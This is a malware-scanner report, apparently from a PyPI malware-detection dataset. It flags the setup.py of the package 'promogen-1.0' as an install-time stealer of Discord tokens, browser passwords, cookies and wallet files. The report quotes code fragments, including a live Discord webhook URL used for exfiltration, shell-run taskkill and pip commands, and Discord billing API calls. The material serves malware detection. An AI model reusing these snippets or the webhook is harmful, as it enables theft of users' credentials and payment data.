{
  "package_name": "promogen-1.0",
  "total_matches": 8,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/promogen-1.0/promogen-1.0/setup.py",
      "file_name": "setup.py",
      "detection_count": 8,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "This code is a classic example of an information-stealing malware, specifically a 'stealer' targeting Discord tokens, browser passwords, cookies, and files of interest from the victim's machine. Key malicious behaviors include: (1) Exfiltration of sensitive data (Discord tokens, passwords, cookies, files) to a hardcoded Discord webhook (https://discord.com/api/webhooks/...), which is a common C2/exfiltration method for malware; (2) Automated collection of browser data (passwords, cookies, tokens) from Chrome, Edge, Opera, Brave, Yandex, and more, including decryption of protected data using Windows APIs; (3) Use of subprocess.Popen to execute shell commands, including killing processes (e.g., taskkill) to unlock files for theft, and installing dependencies at runtime without user consent; (4) Gathering of system and user information (username, IP, geolocation) and sending it to the attacker; (5) Searching for files with sensitive keywords (e.g., 'password', 'wallet', 'crypto') in user directories and exfiltrating them; (6) Use of threading to parallelize data theft and exfiltration, increasing stealth and speed; (7) No user notification, consent, or legitimate business logic for these actions; (8) The code is embedded in a setup.py file, meaning it will execute upon package installation, a hallmark of supply chain attacks. All of these behaviors are strongly associated with malware and are never found in benign software.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "41",
          "type_description": "code-execution: found 3 source code matches",
          "code_snippet": "subprocess.Popen(f\"{executable} -m pip install {modl[1]}\", shell=True)",
          "full_match": "* This package is executing OS commands in the setup.py file at promogen-1.0/setup.py:41",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/promogen-1.0/promogen-1.0/setup.py",
          "relative_path": "promogen-1.0/setup.py"
        },
        {
          "line_number": "648",
          "type_description": "code-execution: found 3 source code matches",
          "code_snippet": "subprocess.Popen(f\"taskkill /im {procc} /t /f >nul 2>&1\", shell=True)",
          "full_match": "* This package is executing OS commands in the setup.py file at promogen-1.0/setup.py:648",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/promogen-1.0/promogen-1.0/setup.py",
          "relative_path": "promogen-1.0/setup.py"
        },
        {
          "line_number": "674",
          "type_description": "code-execution: found 3 source code matches",
          "code_snippet": "subprocess.Popen(f\"taskkill /im {procc} /t /f >nul 2>&1\", shell=True)",
          "full_match": "* This package is executing OS commands in the setup.py file at promogen-1.0/setup.py:674",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/promogen-1.0/promogen-1.0/setup.py",
          "relative_path": "promogen-1.0/setup.py"
        },
        {
          "line_number": "21",
          "type_description": "shady-links: found 5 source code matches",
          "code_snippet": "hook = \"https://discord.com/api/webhooks/1052549671110848542/IJbJYSGisCyG7LPj4Seg5CGxSiA_Fo3FtrSAtgUN8pT3utKu4q9suI3Dge1yl7aNWgs4\"",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at promogen-1.0/setup.py:21",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/promogen-1.0/promogen-1.0/setup.py",
          "relative_path": "promogen-1.0/setup.py"
        },
        {
          "line_number": "29",
          "type_description": "shady-links: found 5 source code matches",
          "code_snippet": "ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at promogen-1.0/setup.py:29",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/promogen-1.0/promogen-1.0/setup.py",
          "relative_path": "promogen-1.0/setup.py"
        },
        {
          "line_number": "161",
          "type_description": "shady-links: found 5 source code matches",
          "code_snippet": "friendlist = loads(urlopen(Request(\"https://discord.com/api/v6/users/@me/relationships\", headers=headers)).read().decode())",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at promogen-1.0/setup.py:161",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/promogen-1.0/promogen-1.0/setup.py",
          "relative_path": "promogen-1.0/setup.py"
        },
        {
          "line_number": "186",
          "type_description": "shady-links: found 5 source code matches",
          "code_snippet": "billingjson = loads(urlopen(Request(\"https://discord.com/api/users/@me/billing/payment-sources\", headers=headers)).read().decode())",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at promogen-1.0/setup.py:186",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/promogen-1.0/promogen-1.0/setup.py",
          "relative_path": "promogen-1.0/setup.py"
        },
        {
          "line_number": "884",
          "type_description": "shady-links: found 5 source code matches",
          "code_snippet": "'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.co...lix.com)'",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at promogen-1.0/setup.py:884",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/promogen-1.0/promogen-1.0/setup.py",
          "relative_path": "promogen-1.0/setup.py"
        }
      ]
    }
  ]
}